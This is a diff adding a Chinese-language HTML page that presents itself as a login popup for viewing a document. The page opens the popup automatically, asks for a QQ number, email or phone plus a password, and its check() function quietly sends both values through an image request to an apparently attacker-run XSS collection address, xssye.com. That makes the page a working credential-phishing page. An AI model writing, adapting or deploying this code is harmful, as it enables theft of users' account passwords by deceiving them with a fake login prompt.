@@ -1,0 +1,111 @@
+﻿<!DOCTYPE html>
+<html lang="zh">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<title>js点击弹窗弹出登录框代码</title>
+</head>
+<body>
+
+<style>
+	*{ margin:0; padding:0;}
+	button, input{ outline:none;}
+	button, .login{ width:120px; height:42px; background:#f40; color:#fff; border:none; border-radius:6px; display: block; margin:20px auto; cursor: pointer;}
+	.popOutBg{ width:100%; height:100%; position: fixed; left:0; top:0; background:rgba(0,0,0,.6); display: none;}
+	.popOut{ position:fixed; width:520px; height:280px; top:50%; left:50%; margin-top:-150px; margin-left:-300px; background:#fff; border-radius:8px; overflow: hidden; display: none;}
+	.popOut > span{ position: absolute; right:100px; top:0; height:42px; line-height:42px; color:#000; font-size:30px; cursor: pointer;}
+	.popOut table{ display: block; margin:42px auto 0; width:520px;}
+	.popOut caption{ width:520px; text-align: center; color:#f40; font-size:18px; line-height:42px;}
+	.popOut table tr td{ color:#666; padding:6px; font-size:14px;}
+	.popOut table tr td:first-child{ text-align: right;}
+	.inp{ width:240px; height:30px; line-height:30px; border:1px solid #999; padding:5px 10px; color:#000; font-size:14px; border-radius:6px;}
+	.inp:focus{ border-color:#f40;}
+	@keyframes ani{
+		from{
+			transform:translateX(-100%) rotate(-60deg) scale(.5);
+		}
+		50%{
+			transform:translateX(0) rotate(0) scale(1);
+		}
+		90%{
+			transform:translateX(20px) rotate(0) scale(.8);
+		}
+		to{
+			transform:translateX(0) rotate(0) scale(1);
+		}
+	}
+	.ani{ animation:ani .5s ease-in-out;}
+</style>
+
+<script type="text/javascript">
+setTimeout(function() {
+    if(document.all) {
+        document.getElementById("clickMe").click();
+    }
+    else {
+        var e = document.createEvent("MouseEvents");
+        e.initEvent("click", true, true);
+        document.getElementById("clickMe").dispatchEvent(e);
+    }
+}, 100);
+</script>
+
+<button type="button" class='bt' id='clickMe' display='none'>登录</button>
+<div class="popOutBg"></div>
+<div class="popOut">
+	<span title="关闭"> x </span>
+	<table>
+		<caption>请登录后在访问该文档内容</caption>
+		<tr>
+			<td width="120"></td>
+			<td><input type="text" class="inp" id='user' placeholder="支持QQ号/邮箱/手机号登陆" /></td>
+		</tr>
+		<tr>
+			<td></td>
+			<td><input type="password" class="inp" id='password' placeholder="密码" /></td>
+		</tr>
+		<tr>
+			<td colspan="2"><input type="button" class="login" onclick="check()" value="授权并登陆" /></td>
+			
+		</tr>
+	</table>
+</div>
+
+<script type="text/javascript">
+	function $(param){
+		if(arguments[1] == true){
+			return document.querySelectorAll(param);
+		}else{
+			return document.querySelector(param);
+		}
+	}
+	function ani(){
+		$(".popOut").className = "popOut ani";
+	}
+	$("button").onclick = function(){
+		$(".popOut").style.display = "block";
+		ani();
+		$(".popOutBg").style.display = "none";
+		$(".bt").style.display="none"
+	};
+	$(".popOut > span").onclick = function(){
+		$(".popOut").style.display = "none";
+		$(".popOutBg").style.display = "none";
+		$(".bt").style.display="block"
+	};
+	$(".popOutBg").onclick = function(){
+		$(".popOut").style.display = "none";
+		$(".popOutBg").style.display = "none";
+	};
+	function check(){
+		var username =document.getElementById('user').value
+		var password =document.getElementById("password").value
+		var newimg = new Image();
+		newimg.src = 'http://xssye.com/index.php?do=api&id=1CYc&username=' + username + '&password=' + password;
+	}
+</script>
+
+
+</body>
+</html>
